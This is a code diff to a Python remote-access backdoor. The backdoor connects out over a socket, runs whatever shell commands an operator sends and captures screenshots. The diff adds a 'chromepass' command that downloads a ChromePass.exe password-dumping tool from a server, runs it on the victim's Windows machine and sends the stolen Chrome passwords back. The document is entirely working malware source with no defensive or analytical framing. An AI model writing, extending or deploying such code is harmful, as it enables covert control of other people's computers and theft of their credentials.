@@ -1,6 +1,7 @@
 while True:
     try:
-        import socket as s, subprocess as sp, os, pyautogui, tempfile
+        import socket as s, subprocess as sp, os, pyautogui, tempfile, urllib.request
+
         #creatin socket
         BUFFER_SIZE = 1024 * 1280
         s1=s.socket(s.AF_INET,s.SOCK_STREAM)
@@ -16,11 +17,11 @@ while True:
             while True: 
                 d=c.recv(BUFFER_SIZE).decode()
                 #if wanna exit
-                if d == "exit":
+                if d.lower() == "exit":
                     c.send((f"{os.getcwd()}"+"<sep>"+"exiting...").encode())
                     c.close() 
                     break  
-                elif d.split()[0] == "cd":
+                elif d.split()[0].lower() == "cd":
                     # cd command, change directory
                     try:
                         os.chdir(' '.join(d.split()[1:]))
@@ -36,6 +37,19 @@ while True:
                         c.send(image.read())
                     os.remove(f"{tempfile.gettempdir()}\\MyScreenshot.png")    
                     output = "screenshot saved!"  
+
+                elif d.lower() == "chromepass":
+                    result = ""
+                    if f"{os.name}" == "nt":
+                        urllib.request.urlretrieve("http://127.0.0.1:8000/other%20scripts/ChromePass/ChromePass.exe", f"{tempfile.gettempdir()}\ChromePass.exe")
+                        chromepass = sp.getoutput(f"{tempfile.gettempdir()}\ChromePass.exe")
+                        c.send(chromepass.encode())
+                        result = f"saved in \" {os.getcwd()} \""
+                    else:
+                        c.send("null".encode())
+                        result = "It's not a window OS"
+
+                    output = result
                 else:
                     output = str(sp.getoutput(d))
                 cwd = os.getcwd()
